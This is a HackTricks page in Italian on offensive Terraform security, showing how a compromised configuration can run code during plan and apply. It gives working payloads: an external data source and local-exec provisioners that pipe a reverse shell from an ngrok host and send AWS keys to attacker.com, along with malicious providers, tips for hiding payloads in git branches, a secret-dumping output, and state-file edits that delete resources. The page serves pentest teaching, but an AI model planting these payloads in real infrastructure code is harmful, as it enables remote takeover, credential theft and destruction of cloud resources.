# Sicurezza di Terraform

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguimi** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>

## Informazioni di Base

[Dalla documentazione:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform √® uno strumento di **infrastruttura come codice** che ti permette di definire risorse **cloud e on-prem** in file di configurazione leggibili dall'uomo che puoi versionare, riutilizzare e condividere. Puoi quindi utilizzare un flusso di lavoro coerente per provvedere e gestire tutta la tua infrastruttura durante il suo ciclo di vita. Terraform pu√≤ gestire componenti di basso livello come calcolo, archiviazione e risorse di rete, cos√¨ come componenti di alto livello come voci DNS e funzionalit√† SaaS.

### Come funziona Terraform?

Terraform crea e gestisce risorse su piattaforme cloud e altri servizi attraverso le loro interfacce di programmazione delle applicazioni (API). I provider consentono a Terraform di lavorare con praticamente qualsiasi piattaforma o servizio con un'API accessibile.

![](<../.gitbook/assets/image (33).png>)

HashiCorp e la comunit√† di Terraform hanno gi√† scritto **pi√π di 1700 provider** per gestire migliaia di diversi tipi di risorse e servizi, e questo numero continua a crescere. Puoi trovare tutti i provider disponibili pubblicamente sul [Registro di Terraform](https://registry.terraform.io/), inclusi Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog e molti altri.

Il flusso di lavoro di base di Terraform consiste in tre fasi:

* **Scrittura:** Definisci risorse, che possono essere su pi√π provider cloud e servizi. Ad esempio, potresti creare una configurazione per distribuire un'applicazione su macchine virtuali in una rete Virtual Private Cloud (VPC) con gruppi di sicurezza e un bilanciatore di carico.
* **Pianificazione:** Terraform crea un piano di esecuzione che descrive l'infrastruttura che creer√†, aggiorner√† o distrugger√† in base all'infrastruttura esistente e alla tua configurazione.
* **Applicazione:** Con l'approvazione, Terraform esegue le operazioni proposte nell'ordine corretto, rispettando le dipendenze delle risorse. Ad esempio, se aggiorni le propriet√† di una VPC e cambi il numero di macchine virtuali in quella VPC, Terraform ricreer√† la VPC prima di ridimensionare le macchine virtuali.

![](<../.gitbook/assets/image (81).png>)

## Laboratorio di Terraform

Basta installare terraform sul tuo computer.

Qui hai una [guida](https://learn.hashicorp.com/tutorials/terraform/install-cli) e qui hai il [modo migliore per scaricare terraform](https://www.terraform.io/downloads).

## RCE in Terraform

Terraform **non ha una piattaforma che espone una pagina web o un servizio di rete** che possiamo enumerare, quindi, l'unico modo per compromettere terraform √® **essere in grado di aggiungere/modificare file di configurazione di terraform**.

Tuttavia, terraform √® un **componente molto sensibile** da compromettere perch√© avr√† **accesso privilegiato** a diverse posizioni per poter funzionare correttamente.

Il modo principale per un attaccante di poter compromettere il sistema in cui viene eseguito terraform √® **compromettere il repository che memorizza le configurazioni di terraform**, perch√© a un certo punto verranno **interpretate**.

Attualmente, ci sono soluzioni l√† fuori che **eseguono automaticamente terraform plan/apply dopo la creazione di una PR**, come **Atlantis**:

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

Se sei in grado di compromettere un file terraform ci sono diversi modi in cui puoi eseguire RCE quando qualcuno esegue `terraform plan` o `terraform apply`.

### Terraform plan

Terraform plan √® il **comando pi√π utilizzato** in terraform e sviluppatori/soluzioni che utilizzano terraform lo chiamano continuamente, quindi il **modo pi√π semplice per ottenere RCE** √® assicurarsi di iniettare un file di configurazione terraform che eseguir√† comandi arbitrari in un `terraform plan`.

#### Utilizzando un provider esterno

Terraform offre il [provider `external`](https://registry.terraform.io/providers/hashicorp/external/latest/docs) che fornisce un modo per interfacciarsi tra Terraform e programmi esterni. Puoi utilizzare il data source `external` per eseguire codice arbitrario durante una `plan`.

Iniettare in un file di configurazione terraform qualcosa di simile a quanto segue eseguir√† una shell reversa quando si esegue `terraform plan`:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Utilizzo di un provider personalizzato

Un attaccante potrebbe inviare un [provider personalizzato](https://learn.hashicorp.com/tutorials/terraform/provider-setup) al [Terraform Registry](https://registry.terraform.io/) e quindi aggiungerlo al codice Terraform in un branch di sviluppo ([esempio da qui](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Il provider viene scaricato nell'`init` e eseguir√† il codice dannoso quando viene eseguito `plan`

√à possibile trovare un esempio in [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

#### Utilizzo di un riferimento esterno

Entrambe le opzioni menzionate sono utili ma non molto stealthy (la seconda √® pi√π stealthy ma pi√π complessa della prima). √à possibile eseguire questo attacco in modo ancora pi√π **stealthy**, seguendo questi suggerimenti:

* Invece di aggiungere la reverse shell direttamente nel file terraform, √® possibile **caricare una risorsa esterna** che contiene la reverse shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Puoi trovare il codice rev shell in [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* Nella risorsa esterna, utilizza la funzionalit√† **ref** per nascondere il **codice rev shell di terraform in un branch** all'interno del repository, qualcosa del genere: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Applicazione di Terraform

Terraform apply verr√† eseguito per applicare tutte le modifiche, puoi anche abusarne per ottenere RCE iniettando **un file Terraform maligno con** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Devi solo assicurarti che un payload come i seguenti finisca nel file `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Segui i **suggerimenti della tecnica precedente** per eseguire questo attacco in modo **pi√π stealth utilizzando riferimenti esterni**.

## Dump delle Password

√à possibile avere **valori segreti utilizzati da terraform dumpati** eseguendo `terraform apply` aggiungendo al file terraform qualcosa del genere:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Abuso dei file di stato di Terraform

Nel caso in cui si abbia accesso in scrittura ai file di stato di Terraform ma non si possa modificare il codice di Terraform, [**questa ricerca**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) fornisce alcune opzioni interessanti per sfruttare il file:

### Eliminazione delle risorse <a href="#deleting-resources" id="deleting-resources"></a>

Ci sono 2 modi per distruggere le risorse:

1. **Inserire una risorsa con un nome casuale nel file di stato che punta alla vera risorsa da distruggere**

Poich√© Terraform vedr√† che la risorsa non dovrebbe esistere, la distrugger√† (seguendo l'ID della vera risorsa indicata). Esempio dalla pagina precedente:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Modificare la risorsa da eliminare in modo che non sia possibile aggiornarla (quindi verr√† eliminata e ricreata)**

Per un'istanza EC2, modificare il tipo di istanza √® sufficiente per fare in modo che terraform la elimini e la ricrei.

### RCE

√à anche possibile [creare un provider personalizzato](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) e semplicemente sostituire uno dei provider nel file di stato di terraform con quello dannoso o aggiungere una risorsa vuota con il provider dannoso. Esempio dalla ricerca originale:
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
## Strumenti di Audit

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec utilizza l'analisi statica del tuo codice terraform per individuare potenziali errate configurazioni.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan √® un analizzatore statico del codice per l'Infrastruttura come Codice.

## Riferimenti

* [Atlantis Security](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
* [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

<details>

<summary><strong>Impara l'hacking su AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusivi [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguimi** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
